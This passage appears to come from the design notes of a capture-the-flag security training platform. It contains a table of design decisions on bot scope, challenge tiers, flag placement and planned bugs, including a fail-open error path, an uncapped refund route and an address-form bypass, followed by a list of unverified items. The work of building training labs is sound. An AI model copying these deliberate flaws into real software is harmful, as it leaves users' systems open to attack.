| DC-4 | Where the collector lives and how the player reads it | (A) In mock-services plus a player inbox page on the shop. (B) A fifth container. (C) In the sidecar. | A | No extra container (FR-INS-02 lists the parts). |
| DC-5 | Bot session scope | (A) Allow-list: tickets and agent-profile only. (B) Full support-agent rights. (C) Full rights but hide flags elsewhere. | A | B would let the XSS read the C01 and C09 flags. |
| DC-6 | Tier mapping (OI-16) | (A) 1-2 Easy, 3 Medium, 4-5 Hard. (B) 1-2 / 3-4 / 5. (C) 1 / 2-3 / 4-5. | A | Uses all three tiers; B and C leave a tier empty. |
| DC-7 | C04 design (OI-19) | (A) Separate quick-refund path without the shared check, everything else correct. (B) Auto-approve on the item path with no cumulative sum. (C) Enforce the cap everywhere and use another bug for C04. | A | Keeps RS-G's correct model and still matches D-26. |
| DC-8 | C10 start state (OI-20) | (A) Pending sellers draft with import. (B) Customer avatar import. (C) Seeded approved seller owner. (D) A and C. | C | No dependency on C11; pending seller stays simple. |
| DC-9 | Support order view hides buyer note | (A) Hide it. (B) Keep it and move the C01 flag elsewhere. | A | Keeps C01 as designed; realistic enough. |
| DC-10 | Where the finance email is found for C07 | (A) Public Contact page. (B) Seller payout statements (needs a seller). | A | Keeps C07 independent of seller accounts. |
| DC-11 | How C09 learns about "zero events" | (A) Shop sends `auth.attempt` and `shop.security_event_written`. (B) Monitor reads the shop DB (RS-F A4). | A | FR-SHP-14 forbids shop DB access by the platform. Needs the interface owner to confirm. |
| DC-12 | Player-given passwords | (A) Random per instance. (B) Fixed. | A | Matches per-instance uniqueness (D-02 spirit). |
| DC-13 | C11 two error classes (422 verbose, 500 fail-open) | (A) Two classes. (B) One class (error and approval together). | A | Gives M1 a separate, observable event. |
| DC-14 | Weak M1 signals for C01, C02, C04 | (A) Accept probing or first use as M1. (B) Merge M1 into M2 for these. | A | Keeps the 20/40/100 rule for all; the PRD acknowledges M1 is a proxy. |
| DC-15 | Proof markers for M2 (C02, C03A) | (A) Static non-secret markers next to the flag. (B) Per-instance markers. | A | Simpler; markers are only meaningful inside a real exploit response. |

## 13. What I could not verify or did not do

- **WSTG IDs** (UNVERIFIED): the pages print section numbers only. None used here.
- **OWASP 2021 and 2025 titles** other than A05: not re-fetched (UNVERIFIED in this session); taken from PRD and D-06. The A03 CWE-477 versus CWE-447 typo was not re-checked.
- **CWE-330, 338, 347, 353, 396, 234, 497, 1188, 1104** and CVE-2019-10744: VERIFIED only by RS-E or RS-F, not re-read by me.
- **CRS tag names** for XSS (`attack-xss`) and others: UNVERIFIED (spike S-6). Part B M1 does not depend on them.
- **Behaviour not run** (all UNVERIFIED): the C06 pollution input on Node 24 (S-9); SQLite read-only mode, `ATTACH` and `load_extension` limits for the catalog store; headless-browser request filtering and tagging of bot traffic; blocking `host.docker.internal` from an internal network on Docker Desktop (S1); 10,000-request brute-force time (S2); bot memory (S-5); whether a link-local-style alias or a decimal-IP form works for the C10 bypass in the chosen Docker setup.
- **Exact numbers** are placeholders: 1,500, 2,500, 5,000, 3 foreign orders, 20 failures in 10 minutes, 10 s delay, 15 s visit, throttles, tier weights.
- **Decoy flags** (D-22): where each challenge's decoy sits is not specified here (RS-C asked each card for it). Needs the anti-cheat design.
- **Realism references** (Optus, TalkTalk, Capital One and others): not used here; they stay in RS-E and RS-F as UNVERIFIED search summaries.
- **No code, no spike, no test was run.** Every test outline above is a design, not a result.
